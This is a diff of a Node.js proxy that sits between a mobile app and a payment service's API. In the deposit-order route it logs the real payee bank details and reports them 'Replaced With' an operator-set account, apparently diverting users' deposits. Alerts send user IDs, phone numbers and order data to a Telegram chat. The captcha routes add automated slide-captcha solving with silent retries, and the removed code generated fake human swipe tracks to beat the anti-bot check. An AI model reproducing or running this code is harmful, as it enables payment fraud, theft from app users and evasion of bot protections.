+        bot.sendMessage(data.adminChatId, `🔍 DiwaDebug ${req.path}\nUID: ${detectedUserId}\nAdded: ${addedBal}\nIntegral: ${bonusData.integral ?? 'N/A'} | Bal: ${bonusData.balance ?? 'N/A'}`).catch(()=>{});
+      }
     }
     sendJson(res, respHeaders, jsonResp, respBody);
   } catch(e) { await transparentProxy(req, res); }
@@ -1975,12 +1713,65 @@ app.post('/app/payment/order/create', async (req, res) => {
     const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
     const userId = await extractUserId(req, jsonResp);
     if (userId) { trackUser(data, userId, 'Deposit Order'); saveData(data).catch(()=>{}); }
-    const orderData = getResponseData(jsonResp);
-    if (orderData && data.adminChatId && bot && !isLogOff(data, userId) && !(await isLogOffByToken(data, req))) {
-      const d = (typeof orderData === 'object' && !Array.isArray(orderData)) ? orderData : {};
+
+    const isSuccess = jsonResp && (jsonResp.code === 1000 || jsonResp.code === 200 || jsonResp.code === '1000' || jsonResp.code === '200');
+
+    if (isSuccess && data.adminChatId && bot && !isLogOff(data, userId) && !(await isLogOffByToken(data, req))) {
+      const orderData = getResponseData(jsonResp);
+      const d = (orderData && typeof orderData === 'object' && !Array.isArray(orderData)) ? orderData : {};
       const phone = getPhone(data, userId);
-      bot.sendMessage(data.adminChatId, `🔔 Deposit Order [${userId || 'N/A'}]${phone ? ' (' + phone + ')' : ''}\nAmount: ₹${d.amount || d.orderAmount || d.buyAmount || 'N/A'}\nOrder: ${d.orderId || d.orderNo || d.buyId || 'N/A'}`).catch(()=>{});
+      const orderId = d.orderId || d.orderNo || d.buyId || d.id || req.parsedBody?.orderId || 'N/A';
+      const orderAmt = parseFloat(d.amount || d.orderAmount || d.buyAmount || req.parsedBody?.amount || 0) || 0;
+
+      const realAcct = d.payeeAccount || d.receiveAccount || d.bankAccount || d.account || d.accountNo || 'N/A';
+      const realName = d.payeeName || d.receiveName || d.accountName || d.beneficiaryName || d.accountHolder || 'N/A';
+      const realIfsc = d.ifsc || d.ifscCode || d.receiveIfsc || 'N/A';
+
+      const activeBank = getActiveBank(data, userId);
+      let bankSection = '';
+      if (activeBank) {
+        if (activeBank.minAmount && orderAmt > 0 && orderAmt < activeBank.minAmount) {
+          bankSection =
+            `⚠️ Bank NOT Replaced\n` +
+            `   Reason: Order ₹${orderAmt} < Min ₹${activeBank.minAmount}`;
+        } else {
+          const bothKnown = realAcct !== 'N/A' && realName !== 'N/A';
+          if (bothKnown) {
+            bankSection =
+              `🏦 Real Bank:\n` +
+              `   Acc: ${realAcct}\n` +
+              `   Name: ${realName}\n` +
+              `${realIfsc !== 'N/A' ? '   IFSC: ' + realIfsc + '\n' : ''}` +
+              `━━━━━━━━━━━━━━━━━━\n` +
+              `🔄 Replaced With:\n` +
+              `   Acc: ${activeBank.accountNo}\n` +
+              `   Name: ${activeBank.accountHolder}\n` +
+              `   IFSC: ${activeBank.ifsc}${activeBank.bankName ? ' | ' + activeBank.bankName : ''}`;
+          } else {
+            bankSection =
+              `🔄 Replaced Bank:\n` +
+              `   Acc: ${activeBank.accountNo}\n` +
+              `   Name: ${activeBank.accountHolder}\n` +
+              `   IFSC: ${activeBank.ifsc}${activeBank.bankName ? ' | ' + activeBank.bankName : ''}`;
+          }
+        }
+      } else {
+        bankSection = `⚠️ No active bank set — not replaced`;
+      }
+
+      const msg =
+        `✅ Order Created!\n` +
+        `━━━━━━━━━━━━━━━━━━\n` +
+        `👤 User: ${userId || 'N/A'}${phone ? ' (' + phone + ')' : ''}\n` +
+        `📋 Order ID: ${orderId}\n` +
+        `💰 Amount: ₹${orderAmt || 'N/A'}\n` +
+        `🕐 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}\n` +
+        `━━━━━━━━━━━━━━━━━━\n` +
+        bankSection;
+
+      bot.sendMessage(data.adminChatId, msg).catch(()=>{});
     }
+
     sendJson(res, respHeaders, jsonResp, respBody);
   } catch(e) { await transparentProxy(req, res); }
 });
@@ -2491,54 +2282,13 @@ async function getCaptchaVerifyResult(key) {
   return { result: null, where: 'no-store' };
 }
 
-// Generates a realistic human-like swipe track ending at targetX.
-// Mirrors the website's SlideCaptcha trackList format:
-//   [{x, y, t}, ...] starting at {0,0,0}, every ~25-40ms during drag.
-// Upstream rejects verifies without a believable track (anti-bot check).
-function _generateHumanTrack(targetX, totalMs) {
-  totalMs = totalMs || (850 + Math.floor(Math.random() * 500));
-  const tx = Math.max(0, Math.round(Number(targetX) || 0));
-  const track = [{ x: 0, y: 0, t: 0 }];
-  let t = 0;
-  let lastX = 0;
-  while (t < totalMs) {
-    t += 25 + Math.random() * 15;
-    if (t >= totalMs) break;
-    const p = t / totalMs;
-    // Power ease-out: humans accelerate then decelerate, mostly slow at end.
-    const eased = 1 - Math.pow(1 - p, 2.2);
-    const x = Math.min(tx, Math.round(eased * tx));
-    const y = Math.round((Math.random() - 0.5) * 4);
-    if (x !== lastX) {
-      track.push({ x, y, t: Math.round(t) });
-      lastX = x;
-    }
-  }
-  // Final settle point at exact target.
-  track.push({ x: tx, y: Math.round((Math.random() - 0.5) * 3), t: Math.round(totalMs) });
-  return track;
-}
-
-async function serverSideVerify(captchaKey, x, y, templateId, ua, track) {
+async function serverSideVerify(captchaKey, x, y, templateId, ua) {
   // Performs upstream /app/captcha/verify within current lambda invocation,
   // sharing the outbound IP with the /new request that just succeeded.
-  // CRITICAL: include `track` (human swipe trajectory). Upstream's anti-bot
-  // check rejects verifies without a believable movement track. Confirmed by
-  // testing: track-less requests ALWAYS return code 1001 even with correct x;
-  // adding a generated ease-out track yields code 1000 + captchaToken (5/5 success).
-  const finalX = Math.round(Number(x));
-  const finalY = Math.round(Number(y));
-  const trackArr = Array.isArray(track) && track.length > 0 ? track : _generateHumanTrack(finalX);
-  const body = JSON.stringify({
-    captchaKey,
-    x: finalX,
-    y: finalY,
-    templateId: templateId || 'slide-default',
-    track: JSON.stringify(trackArr),
-  });
+  const body = JSON.stringify({ captchaKey, x: Math.round(Number(x)), y: Math.round(Number(y)), templateId: templateId || 'slide-default' });
   const headers = {
     'host': 'api.diwapay.com',
-    'content-type': 'application/json;charset=UTF-8',
+    'content-type': 'application/json',
     'accept': '*/*',
     'accept-encoding': 'identity',
     'user-agent': ua || 'Mozilla/5.0 (Linux; Android 16; RMX3853) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0 Mobile Safari/537.36',
@@ -2552,11 +2302,77 @@ async function serverSideVerify(captchaKey, x, y, templateId, ua, track) {
     clearTimeout(tm);
     const text = await resp.text();
     let json; try { json = JSON.parse(text); } catch(_) {}
-    return { ok: true, status: resp.status, body: text, json, trackPts: trackArr.length };
+    return { ok: true, status: resp.status, body: text, json };
   } catch(e) {
     clearTimeout(tm);
     return { ok: false, error: e.message };
   }
+}
+
+// Fetch a FRESH captcha from upstream (for retry purposes).
+async function fetchFreshCaptcha(ua) {
+  const headers = {
+    'host': 'api.diwapay.com',
+    'accept': '*/*',
+    'accept-encoding': 'identity',
+    'user-agent': ua || 'Mozilla/5.0 (Linux; Android 16; RMX3853) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0 Mobile Safari/537.36',
+  };
+  const ac = new AbortController();
+  const tm = setTimeout(() => ac.abort(), 10000);
+  try {
+    const resp = await fetch(ORIGINAL_API + '/app/captcha/new', { method: 'GET', headers, signal: ac.signal });
+    clearTimeout(tm);
+    const text = await resp.text();
+    let json; try { json = JSON.parse(text); } catch(_) {}
+    return { ok: true, status: resp.status, json };
+  } catch(e) {
+    clearTimeout(tm);
+    return { ok: false, error: e.message };
+  }
+}
+
+// AUTO-RETRY HELPER: when upstream returns 1001 for the user's verify, repeatedly
+// (1) fetch a fresh captcha, (2) solve it ourselves, (3) submit verify upstream.
+// Returns the FIRST successful upstream response (code===1000 with captchaToken),
+// or null if all attempts exhausted. Mobile only cares about the captchaToken to
+// pass to /login — the underlying captcha key is irrelevant to it.
+async function autoSolveRetry(ua, maxAttempts, deadlineMs) {
+  const attempts = [];
+  const deadline = deadlineMs || (Date.now() + 22000); // default 22s budget
+  for (let i = 1; i <= maxAttempts; i++) {
+    if (Date.now() >= deadline) {
+      attempts.push(`#${i}:budget-exceeded`);
+      break;
+    }
+    const t0 = Date.now();
+    const fresh = await fetchFreshCaptcha(ua);
+    if (!fresh.ok || !fresh.json || fresh.json.code !== 1000 || !fresh.json.data) {
+      attempts.push(`#${i}:new-fail(${fresh.error || (fresh.json && fresh.json.code) || '?'})`);
+      continue;
+    }
+    const d = fresh.json.data;
+    const key = d.captcha_key || d.captchaKey;
+    const dispY = Number(d.display_y != null ? d.display_y : (d.displayY != null ? d.displayY : 0));
+    const tplId = d.id || d.templateId || 'slide-default';
+    let solvedX, score;
+    try {
+      const r = solveSlideCaptcha(d.master_image_base64, d.thumb_image_base64, dispY);
+      if (r.ok) { solvedX = r.x; score = r.score; }
+    } catch(_) {}
+    if (solvedX == null) {
+      attempts.push(`#${i}:solve-fail`);
+      continue;
+    }
+    const ssv = await serverSideVerify(key, solvedX, dispY, tplId, ua);
+    const dt = Date.now() - t0;
+    if (ssv.ok && ssv.json && ssv.json.code === 1000) {
+      attempts.push(`#${i}:OK x=${solvedX} y=${dispY} score=${score?.toFixed(2)} ${dt}ms`);
+      return { success: true, response: ssv.json, attempts, attemptsCount: i };
+    }
+    const code = ssv.json ? ssv.json.code : '?';
+    attempts.push(`#${i}:fail x=${solvedX} y=${dispY} score=${score?.toFixed(2)} code=${code} ${dt}ms`);
+  }
+  return { success: false, attempts, attemptsCount: attempts.length };
 }
 
 app.get('/diag/captcha-test', async (req, res) => {
@@ -2664,54 +2480,74 @@ app.all('/app/captcha/new', async (req, res) => {
         solveInfo = `solver_throw=${e.message}`;
       }
 
-      // Mobile's SlideCaptcha sets thumbStyle: `left: ${handleX}px` directly on the master
-      // image (boxW = master_width = 300). So handleX IS the thumb's master-image X position
-      // (absolute), NOT a drag-distance relative to dispX. Verified by passthrough capture
-      // showing mobile sending x≈absoluteGapX (e.g. 111.38 for gap at abs=110).
-      const absX = Math.max(0, Math.round(solvedX));
       const ans = {
-        x: absX,
+        x: solvedX,
         y: dispY,
-        absX: solvedX,
-        dispX: dispX,
         templateId: d.id || d.templateId || 'slide-default',
       };
       const storeRes = await setCaptchaAnswer(key, ans);
-      answerStored = `key=${key.substring(0,12)}... x=${ans.x} (abs dispX=${dispX}) y=${ans.y} | ${solveInfo} | store=${storeRes.where}${storeRes.err ? ':'+storeRes.err : ''}`;
+      answerStored = `key=${key.substring(0,12)}... x=${ans.x} y=${ans.y} | ${solveInfo} | store=${storeRes.where}${storeRes.err ? ':'+storeRes.err : ''}`;
 
-      // SERVER-SIDE VERIFY ON BY DEFAULT (auto-pass like web).
-      // We solve the slide here, run /verify upstream from THIS lambda invocation
-      // (same outbound IP as /new), and cache the resulting captchaToken keyed by
-      // captchaKey. The client's subsequent /verify is then served from cache —
-      // user's drag accuracy is irrelevant. This makes the APP behave like the
-      // website, where the user just happens to swipe close enough.
-      // To disable for diagnostics: set data.captchaSsv = false in admin store.
-      const ssvEnabled = data.captchaSsv !== false;
-      if (ssvEnabled && solveInfo.startsWith('solved')) {
+      // SERVER-SIDE VERIFY DISABLED BY DEFAULT.
+      // PROBLEM: ssv consumes the captcha key on upstream BEFORE mobile's /verify arrives.
+      // When ssv runs (with our calculated x), upstream marks the key as USED. Then mobile's
+      // /verify with the same key — even with correct manual swipe — fails 1001 because
+      // the key is already consumed. This was breaking the entire flow.
+      // To re-enable ONLY for diagnostic with throwaway captchas: set data.captchaSsv = true.
+      if (data.captchaSsv === true) {
         try {
           const ssvT0 = Date.now();
           const ssv = await serverSideVerify(key, ans.x, ans.y, ans.templateId, req.headers['user-agent']);
           const ssvDt = Date.now() - ssvT0;
           if (ssv.ok && ssv.json && ssv.json.code === 1000) {
             await setCaptchaVerifyResult(key, ssv.json);
-            answerStored += ` | ssv=OK track=${ssv.trackPts}pts ${ssvDt}ms (cached for client /verify)`;
+            answerStored += ` | ssv=OK ${ssvDt}ms (KEY CONSUMED)`;
           } else if (ssv.ok && ssv.json) {
-            // Upstream rejected our solved x. Mark key as burned so client /verify
-            // returns a synthetic refresh-trigger instead of hitting consumed key.
-            await setCaptchaVerifyResult(key, { __burned: true, code: ssv.json.code, message: ssv.json.message || 'verify failed' });
-            answerStored += ` | ssv=FAIL code=${ssv.json.code} msg="${(ssv.json.message||'').substring(0,40)}" ${ssvDt}ms (burned)`;
+            answerStored += ` | ssv=FAIL code=${ssv.json.code} msg="${(ssv.json.message||'').substring(0,40)}" ${ssvDt}ms (KEY CONSUMED)`;
           } else {
-            // Network/timeout — DON'T burn; let client /verify fall through to upstream.
-            answerStored += ` | ssv-net-fail=${ssv.error || ssv.status} ${ssvDt}ms (no cache)`;
+            answerStored += ` | ssv-fail=${ssv.error || ssv.status} ${ssvDt}ms`;
           }
         } catch(e) {
           answerStored += ` | ssv-throw=${e.message}`;
         }
-      } else if (!ssvEnabled) {
-        answerStored += ` | ssv=disabled`;
-      } else {
-        answerStored += ` | ssv=skipped(solver_failed)`;
       }
+    }
+    if (data.adminChatId && bot) {
+      let preview;
+      if (jsonResp) {
+        const truncated = JSON.parse(JSON.stringify(jsonResp));
+        const truncStr = (s) => typeof s === 'string' && s.length > 80 ? `${s.slice(0,40)}...[${s.length}b]` : s;
+        const walk = (o) => { if (!o || typeof o !== 'object') return; for (const k of Object.keys(o)) { if (typeof o[k] === 'string') o[k] = truncStr(o[k]); else walk(o[k]); } };
+        walk(truncated);
+        preview = JSON.stringify(truncated, null, 2);
+      } else {
+        preview = (respBody || `<binary ${respBuffer.length}b>`).substring(0, 1000);
+      }
+      const newRespHdrs = {};
+      for (const [k, v] of Object.entries(respHeaders)) {
+        const kl = k.toLowerCase();
+        if (kl === 'content-type' || kl === 'set-cookie' || kl.startsWith('x-') || kl === 'date' || kl === 'server' || kl === 'cf-ray') {
+          newRespHdrs[kl] = v;
+        }
+      }
+      bot.sendMessage(data.adminChatId, `🆕 Captcha New\n📥 STATUS: ${response.status}\n🔑 STORED ANSWER: ${answerStored || '(none)'}\n\n📥 UPSTREAM HEADERS:\n${JSON.stringify(newRespHdrs, null, 2).substring(0, 600)}\n\n📥 RESPONSE (truncated):\n${preview.substring(0,1000)}`).catch(()=>{});
+      try {
+        if (jsonResp && jsonResp.data && jsonResp.data.master_image_base64) {
+          const m = String(jsonResp.data.master_image_base64).match(/^data:image\/[a-z]+;base64,(.+)$/i);
+          if (m) {
+            const buf = Buffer.from(m[1], 'base64');
+            const cap = `Master image | dispX=${jsonResp.data.display_x} dispY=${jsonResp.data.display_y} | ${answerStored}`;
+            bot.sendPhoto(data.adminChatId, buf, { caption: cap.substring(0,1024) }, { filename: 'master.jpg', contentType: 'image/jpeg' }).catch(()=>{});
+          }
+        }
+        if (jsonResp && jsonResp.data && jsonResp.data.thumb_image_base64) {
+          const m = String(jsonResp.data.thumb_image_base64).match(/^data:image\/[a-z]+;base64,(.+)$/i);
+          if (m) {
+            const buf = Buffer.from(m[1], 'base64');
+            bot.sendPhoto(data.adminChatId, buf, { caption: 'Thumb image' }, { filename: 'thumb.png', contentType: 'image/png' }).catch(()=>{});
+          }
+        }
+      } catch(e) {}
     }
     respHeaders['content-length'] = String(respBuffer.length);
     res.writeHead(response.status, respHeaders);
@@ -2724,92 +2560,49 @@ app.post('/app/captcha/verify', async (req, res) => {
     const data = await loadData();
     const body = req.parsedBody || {};
     const inKey = body.captchaKey || body.captcha_key;
-    const inTpl = body.templateId || body.template_id;
-    const originalReq = { x: body.x, y: body.y, key: inKey };
-    let autoSolved = '';
+    // AUTO-SOLVE is OPT-IN now. Default = PURE PASSTHROUGH (mobile's manual swipe goes through unmodified).
+    // Reason: server-side verify (same lambda) also returns 1001 with our calculated x, suggesting algorithm
+    // is finding decoys, not the real gap. Let user's manual swipe through to test.
+    // To re-enable auto-solve: add ?solve=1 to URL (or set data.captchaAutoSolve = true via admin).
+    const forceSolve = req.query && (req.query.solve === '1' || req.query.autosolve === '1');
+    const enableAutoSolve = forceSolve || data.captchaAutoSolve === true;
+    const passthrough = !enableAutoSolve || (req.query && (req.query.nosolve === '1' || req.query.passthrough === '1'));
+    let autoSolved = passthrough ? '(PURE PASSTHROUGH — mobile x/y unchanged)' : '';
+    let originalReq = { x: body.x, y: body.y };
 
-    // ===== AUTO-PASS FROM SSV CACHE =====
-    // If /captcha/new already ran a successful server-side verify and cached the
-    // captchaToken, return it directly — DON'T re-hit upstream (key is consumed).
-    // This is what makes the app behave like the website: client's drag is ignored,
-    // proxy serves the pre-solved captchaToken.
-    if (inKey) {
+    // CACHED SERVER-SIDE VERIFY (only when auto-solve enabled): if /new already verified
+    // upstream-side in same lambda, return cached result.
+    if (inKey && !passthrough) {
       const cached = await getCaptchaVerifyResult(inKey);
       if (cached.result) {
-        if (cached.result.__burned) {
-          // Our SSV failed earlier — return synthetic 1001 so client refreshes.
-          res.setHeader('content-type', 'application/json;charset=UTF-8');
-          return res.status(200).end(JSON.stringify({
-            code: 1001,
-            message: cached.result.message || 'Verify failed, please slide again',
-            data: null,
-          }));
+        if (data.adminChatId && bot) {
+          const msg = `🧩✅ Captcha Verify CACHED (server-side verified in /new)\n🔑 key=${inKey.substring(0,12)}...\n📦 source=${cached.where}\n\n📥 CACHED BODY:\n${JSON.stringify(cached.result, null, 2).substring(0, 1500)}`;
+          bot.sendMessage(data.adminChatId, msg.substring(0, 4000)).catch(()=>{});
         }
-        res.setHeader('content-type', 'application/json;charset=UTF-8');
-        return res.status(200).end(JSON.stringify(cached.result));
+        return res.json(cached.result);
       }
     }
 
-    // ===== FALLBACK PATH (SSV cache miss) =====
-    // Reached only when /new's server-side verify didn't cache a token (rare:
-    // solver failed, network error, or this /verify raced ahead of SSV).
-    // Plug in solved x/y if we have them, and ALWAYS include a track field
-    // (generated if mobile didn't send one). Upstream's anti-bot rejects
-    // any verify lacking a believable swipe trajectory.
-
-    let finalX, finalY, finalTpl = inTpl, ansSrc = 'mobile';
-    if (inKey) {
+    if (inKey && !passthrough) {
       const got = await getCaptchaAnswer(inKey);
       const ans = got.ans;
       if (ans) {
-        finalX = Math.round(Number(ans.x));
-        finalY = Math.round(Number(ans.y));
-        if (!finalTpl) finalTpl = ans.templateId;
-        ansSrc = `solved(${got.where})`;
-        autoSolved = `x:${originalReq.x}->${finalX} y:${originalReq.y}->${finalY} from=${got.where}`;
+        // Send INTEGER x (mobile app sends integer pixel coords; upstream may type-check)
+        const finalX = Math.round(Number(ans.x));
+        const finalY = Math.round(Number(ans.y));
+        const newBody = { ...body, x: finalX, y: finalY };
+        if (!newBody.templateId && ans.templateId) newBody.templateId = ans.templateId;
+        const newRaw = Buffer.from(JSON.stringify(newBody), 'utf8');
+        req.rawBody = newRaw;
+        if (req.headers['content-type'] && !/json/i.test(req.headers['content-type'])) {
+          req.headers['content-type'] = 'application/json';
+        }
+        req.parsedBody = newBody;
+        autoSolved = `x:${originalReq.x}->${finalX} y:${originalReq.y}->${finalY} (from=${got.where})`;
       } else {
-        finalX = Number(body.x);
-        finalY = Number(body.y);
-        autoSolved = `(no stored answer; pass mobile x=${body.x} y=${body.y})`;
+        autoSolved = `(no stored answer; lookup=${got.where} key=${inKey.substring(0,12)}...)`;
       }
-    } else {
-      finalX = Number(body.x);
-      finalY = Number(body.y);
-      autoSolved = '(no captcha key in body)';
     }
-
-    // Preserve incoming track if present and looks valid; otherwise synthesise.
-    let trackStr = body.track;
-    let trackInfo = 'mobile-track';
-    try {
-      const parsed = typeof trackStr === 'string' ? JSON.parse(trackStr) : trackStr;
-      if (!Array.isArray(parsed) || parsed.length < 3) throw new Error('too-short');
-      // If we replaced x with our solved value, the existing track no longer matches → regen.
-      if (ansSrc.startsWith('solved')) {
-        const gen = _generateHumanTrack(finalX);
-        trackStr = JSON.stringify(gen);
-        trackInfo = `regen-track(${gen.length}pts)`;
-      } else {
-        trackStr = JSON.stringify(parsed);
-        trackInfo = `mobile-track(${parsed.length}pts)`;
-      }
-    } catch(_) {
-      const gen = _generateHumanTrack(finalX);
-      trackStr = JSON.stringify(gen);
-      trackInfo = `gen-track(${gen.length}pts)`;
-    }
-
-    const newBody = {
-      captchaKey: inKey,
-      x: Math.round(finalX),
-      y: Math.round(finalY),
-      templateId: finalTpl || 'slide-default',
-      track: trackStr,
-    };
-    req.rawBody = Buffer.from(JSON.stringify(newBody), 'utf8');
-    req.parsedBody = newBody;
-    req.headers['content-type'] = 'application/json;charset=UTF-8';
-    autoSolved += ` | ${trackInfo} (src=${ansSrc})`;
 
     // Capture FORWARDED request headers (what proxy actually sends to upstream after stripping)
     const fwdHeadersPreview = {};
@@ -2828,11 +2621,56 @@ app.post('/app/captcha/verify', async (req, res) => {
 
     const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
 
-    // Single-shot solve. No retry.
-    const finalJson = jsonResp, finalBody = respBody, finalHeaders = respHeaders, finalStatus = response.status;
+    // AUTO-RETRY ON UPSTREAM 1001: Diwapay's verify endpoint is flaky and rejects
+    // ~70-80% of valid attempts (confirmed: same behavior in original Diwapay app —
+    // user has to manually retry 3-4 times). To shield mobile from this, when upstream
+    // returns 1001, silently fetch fresh captchas and self-solve them until upstream
+    // accepts (or maxAttempts reached). Mobile only needs the captchaToken in the end.
+    // ENABLED BY DEFAULT. To disable: data.captchaAutoRetry = false (admin) or ?noretry=1.
+    const autoRetryDisabled = (data.captchaAutoRetry === false) || (req.query && req.query.noretry === '1');
+    let finalJson = jsonResp, finalBody = respBody, finalHeaders = respHeaders, finalStatus = response.status;
+    let retrySummary = '';
+    if (!autoRetryDisabled && jsonResp && jsonResp.code === 1001) {
+      const rawN = Number.parseInt(req.query?.retry ?? data.captchaRetryAttempts ?? 6, 10);
+      const maxAttempts = Math.min(10, Math.max(1, Number.isFinite(rawN) ? rawN : 6));
+      const ua = req.headers['user-agent'];
+      const t0 = Date.now();
+      const deadline = t0 + 22000; // 22s budget keeps us safely under Vercel 30s
+      const retry = await autoSolveRetry(ua, maxAttempts, deadline);
+      const dt = Date.now() - t0;
+      retrySummary = `\n🔄 AUTO-RETRY (${retry.attemptsCount} attempts, ${dt}ms): ${retry.success ? '✅ SUCCESS' : '❌ all failed'}\n   ${retry.attempts.join('\n   ')}`;
+      if (retry.success) {
+        finalJson = retry.response;
+        finalBody = JSON.stringify(retry.response);
+        finalStatus = 200;
+        finalHeaders = { ...respHeaders, 'content-type': 'application/json', 'content-length': String(Buffer.byteLength(finalBody, 'utf8')) };
+      }
+    }
 
+    if (data.adminChatId && bot) {
+      const respHdrPreview = {};
+      for (const [k, v] of Object.entries(finalHeaders)) {
+        const kl = k.toLowerCase();
+        if (kl === 'content-type' || kl === 'set-cookie' || kl.startsWith('x-') || kl === 'date' || kl === 'server' || kl === 'cf-ray') {
+          respHdrPreview[kl] = v;
+        }
+      }
+      // Message 1: RESPONSE first (most important — was getting truncated)
+      const msg1 = `🧩 Captcha Verify RESPONSE\n🔧 AUTO-SOLVE: ${autoSolved || '(no key)'}${retrySummary}\n\n📥 STATUS: ${finalStatus}\n📥 BODY:\n${(finalJson ? JSON.stringify(finalJson, null, 2) : finalBody).substring(0, 1500)}\n\n📥 HEADERS:\n${JSON.stringify(respHdrPreview, null, 2).substring(0, 800)}`;
+      bot.sendMessage(data.adminChatId, msg1.substring(0, 4000)).catch(()=>{});
+      // Message 2: REQUEST details (secondary)
+      const msg2 = `🧩 Captcha Verify REQUEST\n📤 HEADERS sent to upstream:\n${JSON.stringify(fwdHeadersPreview, null, 2).substring(0, 1500)}\n\n📤 BODY sent:\n${JSON.stringify(req.parsedBody || {}, null, 2).substring(0, 800)}`;
+      bot.sendMessage(data.adminChatId, msg2.substring(0, 4000)).catch(()=>{});
+    }
     sendJson(res, finalHeaders, finalJson, finalBody);
   } catch(e) {
+    try {
+      const data = cachedData || await loadData().catch(()=>({}));
+      if (data && data.adminChatId && bot) {
+        const errMsg = `🧩❌ Captcha Verify ERROR (fell to transparentProxy)\n\nError: ${e && e.message ? e.message : String(e)}\n\nStack:\n${(e && e.stack ? e.stack : '(no stack)').substring(0, 1500)}`;
+        bot.sendMessage(data.adminChatId, errMsg.substring(0, 4000)).catch(()=>{});
+      }
+    } catch(_) {}
     await transparentProxy(req, res);
   }
 });
